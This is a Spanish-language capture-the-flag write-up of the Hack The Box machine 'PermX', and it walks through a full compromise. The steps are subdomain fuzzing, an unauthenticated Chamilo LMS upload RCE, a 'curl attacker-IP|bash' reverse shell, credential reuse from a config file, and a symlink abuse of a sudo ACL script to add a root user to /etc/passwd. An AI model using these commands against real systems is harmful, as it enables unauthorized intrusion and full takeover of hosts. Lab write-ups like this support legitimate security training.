---
tags:
title: PermX- Easy (HTB)
permalink: /PermX-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmapf 10.129.222.87
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 11:46 -0500
Initiating Ping Scan at 11:46
Scanning 10.129.222.87 [4 ports]
Completed Ping Scan at 11:46, 0.47s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:46
Completed Parallel DNS resolution of 1 host. at 11:46, 0.50s elapsed
Initiating SYN Stealth Scan at 11:46
Scanning 10.129.222.87 [65535 ports]
Discovered open port 80/tcp on 10.129.222.87
Discovered open port 22/tcp on 10.129.222.87
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 82.37% done; ETC: 11:46 (0:00:01 remaining)
Completed SYN Stealth Scan at 11:46, 9.88s elapsed (65535 total ports)
Nmap scan report for 10.129.222.87
Host is up, received echo-reply ttl 63 (0.37s latency).
Scanned at 2026-02-09 11:46:07 EST for 10s
Not shown: 64436 closed tcp ports (reset), 1097 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.03 seconds
           Raw packets sent: 91791 (4.039MB) | Rcvd: 78866 (3.155MB)
-e [*] IP: 10.129.222.87
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 11:46 -0500
Nmap scan report for 10.129.222.87
Host is up (0.63s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.15 seconds
```
## Website 

La pagina principal no muestra mucho..

![image-center](/assets/images/Pasted image 20260210163317.png)
## Shell as www-data
### Subdomain enumeration

Así que enumere subdominios con `wfuzz`, viendo asi `lms`.

```bash
wfuzz -c -t 200 -H "Host: FUZZ.permx.htb" -u http://permx.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hl 9
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://permx.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000477:   200        352 L    940 W      19347 Ch    "lms"
```
### Chamilo LMS RCE

Vi que en esta web corre `Chamilo LMS`.

![image-center](/assets/images/Pasted image 20260209135611.png)
### Exploit

Para este servicio busque por exploits asociados y vi que tiene una vulnerabilidad la cual permite la ejecución remota de comandos a través de una subida de archivos.

```bash
searchsploit chamilo
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chamilo 1.8.7 / Dokeos 1.8.6 - Remote File Disclosure                                                                                                     | php/webapps/16114.txt
Chamilo LMS - Persistent Cross-Site Scripting                                                                                                             | php/webapps/39474.txt
Chamilo LMS 1.11.14 - Account Takeover                                                                                                                    | php/webapps/50694.txt
Chamilo LMS 1.11.14 - Remote Code Execution (Authenticated)                                                                                               | php/webapps/49867.py
Chamilo LMS 1.11.24 - Remote Code Execution (RCE)                                                                                                         | php/webapps/52083.py
Chamilo LMS 1.11.8 - 'firstname' Cross-Site Scripting                                                                                                     | php/webapps/45536.txt
Chamilo LMS 1.11.8 - Cross-Site Scripting                                                                                                                 | php/webapps/45535.txt
Chamilo LMS 1.9.10 - Multiple Vulnerabilities                                                                                                             | php/webapps/36435.txt
Chamilo Lms 1.9.6 - 'profile.php?password' SQL Injection                                                                                                  | php/webapps/30012.txt
Chamilo LMS 1.9.8 - Blind SQL Injection                                                                                                                   | php/webapps/36040.txt
Chamilo LMS IDOR - 'messageId' Delete POST Injection                                                                                                      | php/webapps/39473.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

En mi caso use el RCE sin autenticación ya que no poseo credenciales, y lo renombre para luego ejecutar un ping hacia mi maquina.

```bash
python3 exploit.py http://lms.permx.htb 'ping -c 1 10.10.17.19'
[+] File uploaded successfully!
[+] Access the shell at: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=
[+] Command Output:
PING 10.10.17.19 (10.10.17.19) 56(84) bytes of data.
64 bytes from 10.10.17.19: icmp_seq=1 ttl=63 time=817 ms

--- 10.10.17.19 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 817.409/817.409/817.409/0.000 ms
```
### Shell

Y efectivamente tengo conectividad.

```bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:04:06.386832 IP permx.htb > 10.10.17.19: ICMP echo request, id 1, seq 1, length 64
12:04:06.390937 IP 10.10.17.19 > permx.htb: ICMP echo reply, id 1, seq 1, length 64
```

Por lo que cree un archivo `index.html` con una reverse shell y luego con `curl` lo ejecute con `bash`.

```bash
python3 exploit.py http://lms.permx.htb 'curl 10.10.17.19|bash'
[+] File uploaded successfully!
[+] Access the shell at: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=
```

Veo que el archivo es descargado desde mi servidor.

```bash
www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/permX]
allPorts  chamilo.txt  exploit.py  ferox-http_permx_htb_-1770655853.state  hydra.restore  index.html  port_scan  reports
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.222.87 - - [09/Feb/2026 12:05:08] "GET / HTTP/1.1" 200 -
```

Y desde mi listener `nc` recibo la conexion como el usuario `www-data`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.222.87] 38990
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
## Shell as mtz
### Database connection

Encontré un archivo `php` con credenciales de conexion para la base de datos local del sistema.

```bash
www-data@permx:/var/www/chamilo/app/config$ grep -v "^//" configuration.php
<SNIP>
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
$_configuration['db_manager_enabled'] = false;
<SNIP>
```

Y su password era valida para el usuario `mtz` así que me conecte vía `ssh`.

```bash
ssh mtz@permx.htb
<SNIP>
mtz@permx:~$ cat user.txt
8527a3...
```
## Shell as root
### Sudo privileges

Viendo los privilegios `sudo` de este usuario veo que puede ejecutar el script `acl.sh` como root.

```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

### Source code

Viendo el código del mismo, veo que solicita un `usuario`, el tipo de permisos a asignar a un archivo, asignándole permisos de escritura al mismo

```bash
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

### Simlink abuse

Por lo que cree un archivo en el directorio `/home/mtz` y cree un link simbólico al `/etc/passwd` para luego poder escribir en el.

```bash
mtz@permx:~$ ln -s /etc/passwd /home/mtz/exploit_passwd
```

Luego de esto, ejecute el script como `root`, haciendo que el usuario `mtz` tenga permisos de escritura en dicho archivo, haciendo que yo pueda crear una password para el usuario `hacker` por ejemplo, y luego editar este archivo para que este usuario tenga los permisos de `root` y así luego poder loguearme como el.
### Writing /etc/passwd

Primero ejecute el script.

```
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/exploit_passwd
```

Luego con `openssl` cree el hash de la contraseña `password123`.

```bash
openssl passwd -1 -salt x25T/F/9 "password123"
$1$x25T/F/9$0SN6u3kJ1bDKwrvTyf4lh/
```

Y dicho hash lo coloque dentro del `/etc/passwd`, asignando también el `uid/gid` del usuario root.

```bash
mtz@permx:~$ nano /etc/passwd
mtz@permx:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
hacker:$1$x25T/F/9$0SN6u3kJ1bDKwrvTyf4lh/:0:0:root:/root:/bin/bash
```
### Shell

Luego como pude reescribir dicho archivo, y el usuario hacker se creo, migre a este usuario, convirtiéndome así en el usuario `root`.

```bash
mtz@permx:~$ su hacker
Password:
root@permx:/home/mtz# whoami
root
```

```bash
root@permx:/home/mtz# cat /root/root.txt
a3fhc4...
```

`~Happy Hacking`